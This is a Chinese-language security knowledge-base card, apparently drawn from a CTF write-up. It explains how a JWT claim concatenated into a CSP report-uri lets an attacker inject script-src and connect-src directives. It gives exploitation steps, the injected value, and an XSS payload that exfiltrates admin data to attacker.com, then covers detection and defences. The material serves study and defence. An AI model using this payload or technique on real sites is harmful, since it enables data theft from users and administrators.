---
id: web-generic-xss-csp-report-uri-claim-injection
title: JWT 自定义 claim 注入 CSP report-uri：补写 script-src/connect-src 绕过默认 CSP
type: scenario
domain: web
path: web/generic/xss
technique: csp-report-uri-claim-injection
aliases:
- CSP 注入
- report-uri 注入
- CSP 指令注入
- script-src 覆盖 default-src
- JWT claim 注入 CSP
- CSP bypass by token
tags:
- xss
- csp
- jwt
- header-injection
- csp-bypass
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T11:54:49+08:00'
  notes: 已对照原文核对：util.py 中 REPORT_URI=f"/api/csp-report?token={g.session.get('token')}" 直接以 report-uri 拼入 CSP 头，token claim 未过滤；注入 foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *; 后 script-src/connect-src 覆盖 default-src 'self'，与卡内原理/PoC 一致，最终用于 Bot 页面 XSS 外带。未验证点：PoC 未在本机执行；需攻击者能控制 JWT claim（卡内已列伪造/弱密钥等前提）。frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

当应用把 JWT 中的自定义 claim（如 `token`）直接拼进 `Content-Security-Policy` 的 `report-uri` 指令时，claim 里的 `;` 可以提前结束当前指令并追加 `script-src 'unsafe-inline' 'unsafe-eval'; connect-src *;`，覆盖默认 `default-src 'self'`，使注入的 XSS 能执行并外带数据。

## 原理

- CSP 是分号分隔的指令列表，同一类资源由更具体的指令覆盖 `default-src`：页面若只设 `default-src 'self'`，追加的 `script-src` 会取代它对脚本来源的限制，`connect-src` 会取代它对 fetch/XHR/WebSocket 的限制。
- 应用代码把 `g.session.get('token')` 拼进 `report-uri /api/csp-report?token=<token>`，再把整串作为 `report-uri <uri>;` 追加到 CSP 头；`token` 来自 JWT payload，未做字符过滤。
- 攻击者把 token 设为 `foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;`，CSP 变为：
  `default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; report-uri foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;`
- 结果：内联脚本和 `eval` 被允许，页面可向任意域发起请求，XSS 载荷既能执行又能把 Flag/敏感数据外带。
- 之所以成立：CSP 头是字符串拼接而非结构化构造，用户可控值跨越了“指令参数”边界；CSP 解析器把 `;` 当作指令分隔符，后出现的同名指令覆盖 `default-src`。

## 触发条件

- 应用根据用户可控值动态生成 CSP（常见于 `report-uri`、`report-to`、nonce 拼接）。
- 该值来自 JWT claim、Cookie、请求参数等攻击者可修改的位置。
- 攻击者能伪造/签发带任意 claim 的 JWT（如 jku 劫持、弱密钥、alg=none），或该 claim 本身由用户提交。
- 页面存在 XSS 注入点（存储型/反射型），且受害者是浏览器/管理 Bot。
- 浏览器支持 CSP 且按标准解析指令覆盖关系。

## 利用步骤

1. 确认 CSP 头由可控值拼接：观察响应头中 `report-uri` 是否回显 Cookie/JWT 中的字段。
2. 构造注入值：`foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;`。
3. 通过 JWT 伪造/修改把该值写入 token claim，设置对应 Cookie。
4. 访问带 CSP 的页面，检查响应头是否出现注入的 `script-src`/`connect-src`。
5. 在页面注入 XSS 载荷（如 `<img src=x onerror="fetch('/api/list')...">`），验证脚本执行与任意域外带。
6. 若目标是管理 Bot，把载荷存入其会访问的列表/页面，等待 Bot 触发。

## PoC

JWT payload 中的注入值：

```text
foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;
```

生成的 CSP 响应头（原文）：

```http
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; report-uri foo; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src *;
```

XSS 载荷示例：

```html
<img src=x onerror="fetch('/api/list').then(r=>r.json()).then(d=>{let f=d.submissions.find(s=>s.user==='admin').idea;fetch('https://attacker.com/?leak='+encodeURIComponent(f))})">
```

说明：原文在 BoneChewerCon 挑战中通过伪造 admin JWT 注入 CSP 指令，使 Bot 页面中的存储型 XSS 能执行并外带 Flag；PoC 未在本会话执行。

## 变体与关联

- **其他指令注入**：`report-to`、`base-uri`、`frame-ancestors`、`form-action`、`img-src`、`style-src`；可放宽限制或改变上报目标。
- **上报数据泄露**：把 `report-uri` 指向攻击者，可收到 CSP 违规报告（含被拦截 URL、页面地址等），本身也是信息泄露。
- **其他头拼接**：`Link`、`Set-Cookie`、`Refresh`、`Access-Control-Allow-Origin` 等由用户输入拼接时同样可能被注入。
- 关联：[[web-generic-xss-csp-self-jsonp-callback-bypass]]（不改 CSP 的绕过）、[[web-generic-jwt-jku-header-hijack]]（伪造带任意 claim 的 JWT）、[[web-generic-crlf-nginx-uri-location-set-cookie]]（同一挑战链中用于替换 Bot Cookie）。

## 检测与防御

- **检测**：CSP 头中出现多个 `script-src`/`connect-src` 或异常 `report-uri`；JWT claim 含 `;`、引号、空格等 CSP 元字符；响应头长度/内容异常；CSP 违规报告指向外部域。
- **防御**：用结构化方式构造 CSP，`report-uri` 使用服务端固定值，不拼接任何用户输入；对 token 等 claim 做白名单/格式校验；显式设置 `script-src`（nonce/hash）而非只依赖 `default-src`；避免在 HTTP 头中嵌入用户可控字符串；对 CSP 头做单元测试与运行时校验。
